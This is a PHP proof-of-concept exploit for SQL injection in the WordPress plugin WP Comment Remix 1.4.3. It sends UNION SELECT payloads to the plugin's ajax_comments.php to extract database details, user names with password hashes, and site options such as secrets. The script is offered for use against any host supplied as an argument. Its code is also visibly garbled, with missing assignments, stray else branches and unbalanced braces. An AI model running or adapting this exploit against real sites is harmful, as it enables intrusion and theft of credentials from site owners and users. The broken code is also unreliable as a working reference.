WP Comment Remix 1.4.3 Remote SQL Injection Exploit
===================================================


<?php
	/**
	 * WP Comment Remix 1.4.3 SQL Injection
	 * Proof of Concept
	 * By g30rg3_x 
	 *
	 * Attention:
	 * This is a Proof-of-Concept it was never intended to be fully functional
	 *
	 * Notes:
	 * Uses cURL
	 */

	// Script Header
	function head() {
		print "\n WP Comment Remix 1.4.3 SQL Injection";
		print "\n ------------------------------------------------";
		print "\n This is a Proof-of-Concept it was never intended to be fully functional\n";
	}

	// Usage Information
	function usage() {
		global $argv;
		head();
		print "\n  <host>: Hostname or IP Address";
		print "\n  <path>: Path to WordPress (Defaults to: /)";
		print "\n  <information>: Information to Extract (Defaults to: relevant)";
		print "\n    dbinfo = Extract MySQL Current User, Database and Version";
		print "\n    admins = Extract Only Admins (users with level 10)";
		print "\n    users = Extract All Users (includes admins)";
		print "\n    options = Extract Relevant Options like active_plugins, secret, ...";
		print "\n    alloptions = Extrac All Options (Huge data would be directly printed out!)";
		print "\n    relevant = dbinfo + admins + options";
		print "\n    all = dbinfo + users + alloptions";
		print "\n Examples:";
		print "\n  php {$argv[0]} foo.bar";
		print "\n";
		exit();
	}

	// cURL HTTP GET
	function GET($url) {
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(&#039;Connection: Close&#039;));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT, &#039;WP-Comment-Remix 1.4.3 SQL Injection Proof-of-Concept&#039;);
		$result = curl_exec($ch);
		curl_close($ch);

			return $result;
		else
			return false;
	}

	// Obtain Database Information
	function obtainDBInfo() {
		$injection = &#039;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,user(),0x7D44427B,database(),0x7D76657273696F6E7B,version(),0x7D),10,11,12,13,14,15--&#039;;
		$result = GET($url . $injection);
		$db[&#039;user&#039;] = $captured[&#039;user&#039;][0];
		$db[&#039;name&#039;] = $captured[&#039;DB&#039;][0];
		$db[&#039;version&#039;] = $captured[&#039;version&#039;][0];
		return $db;
	}

	// Obtain WordPress Users Information
	function obtainUsersInfo($all = false) {
		$result = GET($url . $injection);
		for( $i = 0; $i < count($captured[&#039;user&#039;]); $i++ )
			$users[$captured[&#039;user&#039;][$i]] = $captured[&#039;pass&#039;][$i];
		return $users;
	}

	// Obtain WordPress Options Information
	function obtainOptionsInfo($all = false) {
		$result = GET($url . $injection);
		for( $i = 0; $i < count($captured[&#039;name&#039;]); $i++ )
			$options[$captured[&#039;name&#039;][$i]] = $captured[&#039;value&#039;][$i];
		return $options;
	}

	// Set no time limit (only if safe mode is off)
	if ( !ini_get(&#039;safe_mode&#039;) )
		set_time_limit(0);

	// Print usage if there is no host
	if ( !isset($argv[1]) )
		usage();

	// Header, Arguments and Generate URL
	head();
	$host = $argv[1];
	$path = isset($argv[2]) ? $argv[2] : &#039;/&#039;;
	$info = isset($argv[3]) ? $argv[3] : &#039;relevant&#039;;
	$url = &#039;http://&#039; . $host . $path . &#039;wp-content/plugins/wp-comment-remix/ajax_comments.php?p=0&#039;;

	// Check if we can reach "ajax_comments.php"
	print "\n Does ajax_comments.php exist? ... ";
	$result = GET($url);
	if ( !$result ) {
		print "No";
		print "\n -----------------------------------------------------------";
		print "\n Seems that the site does not have WP Comment Remix installed";
		print "\n OR the path you proportionate is incorrect.";
		print "\n Please review your arguments and try again.\n";
		exit();
	}
	print &#039;Yes&#039;;

	// Check if is it possible to inject...
	// ToDo: Some WordPress installations return more than 15 columns (this is caused by some plugins that alter
	// the comments table structure and don&#039;t revert back this change) so this injection may fail A LOT in a non-default
	// enviroment (ie. sites with many plugins), so if you REALLY want this PoC to be more "functional" then improve
	// this part of the PoC; it was never my intention to deliver a "fully functional" Proof-of-Concept.
	print "\n Can we Inject SQL Code? ... ";
	$result = GET($url . &#039;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--&#039;);
		print "No";
		print "\n --------------------------------------";
		print "\n Seems that the host is already patched.\n";
		exit();
	}
	print &#039;Yes&#039;;

	if ( $info != &#039;dbinfo&#039;) {
			print "No";
			print "\n ------------------------------------------------";
			print "\n But this time we are not exiting, cause we can still extract";
			print "\n the database information, so m just going to change your choice";
			print "\n to dbinfo so you can still get that valuable information.";
			print "\n ------------------------------------------------\n";
			$info = &#039;dbinfo&#039;;
		} else {
			print &#039;Yes&#039;;
		}
	}

	// Now is time to inject
	print "\n\n Seems that everything is fine so now it&#039;s super fun time :P...";
	switch($info) {
		case &#039;all&#039;:
			$db = obtainDBInfo();
			$users = obtainUsersInfo(true);
			$options = obtainOptionsInfo(true);
			break;
		case &#039;relevant&#039;:
			$db = obtainDBInfo();
			$users = obtainUsersInfo();
			$options = obtainOptionsInfo();
			break;
		case &#039;dbinfo&#039;:
			$db = obtainDBInfo();
			break;
		case &#039;admins&#039;:
			$users = obtainUsersInfo();
			break;
		case &#039;users&#039;:
			$users = obtainUsersInfo(true);
			break;
		case &#039;options&#039;:
			$options = obtainOptionsInfo();
			break;
		case &#039;alloptions&#039;:
			$options = obtainOptionsInfo(true);
			break;
	}

	/* It&#039;s Show Time */

	// Database Information
	if ( !empty($db) ) {
		print "\n\n Database Information";
		print "\n ---------------------";
		print "\n MySQL User: {$db[&#039;user&#039;]}";
		print "\n MySQL Version: {$db[&#039;version&#039;]}";
		print "\n MySQL Database Name: {$db[&#039;name&#039;]}";
	}

	// Users Information
	if ( !empty($users) ) {
		print "\n\n Users";
		print "\n ---------";
		foreach( (array) $users as $user => $pass ) {
			print "\n Username: {$user}";
			print "\n Password: {$pass}  " . ( strlen($pass) <= 32 ? &#039;(MD5)&#039; : &#039;(Passhash)&#039; );
			print "\n ---------";
		}
	}

	// Options Information
	if ( !empty($options) ) {
		print "\n\n Options";
		print "\n ---------";
		foreach( (array) $options as $name => $value ) {
			print "\n Name: {$name}";
			print "\n Value: {$value}";
			print "\n ---------";
		}
	}

	// Good Bye =)
	print "\n\n Have Fun! =)\n";
?>




